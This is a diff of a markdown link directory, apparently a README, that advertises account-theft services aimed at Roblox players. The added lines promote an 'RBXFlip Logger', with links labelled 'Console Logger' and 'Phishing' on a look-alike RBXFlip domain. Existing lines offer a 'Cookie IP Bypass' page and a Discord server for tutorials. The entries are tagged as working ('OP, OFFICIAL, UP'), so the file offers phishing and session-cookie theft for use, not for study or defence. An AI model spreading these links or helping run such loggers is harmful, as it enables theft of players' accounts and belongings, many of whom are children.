@@ -13,5 +13,10 @@
 ## Cookie IP Bypass Log In (OP, OFFICIAL, UP) 🟢
 [Click To Go Cookie Ip Bypass](https://story-of-jesus.xyz/refresh/ip-bypasser.php)
 
+## RBXFlip Logger (OP, OFFICIAL, UP) 🟢
+[Click To Go Console Logger](https://rbxflip.eu/directory.php/)
+
+[Click To Go Phishing](https://rbxflip.eu/index.php/)
+
 ## Tutorial and Discord Server
 [Join Discord Server](https://discord.gg/Y4zkZNMv) 🟢
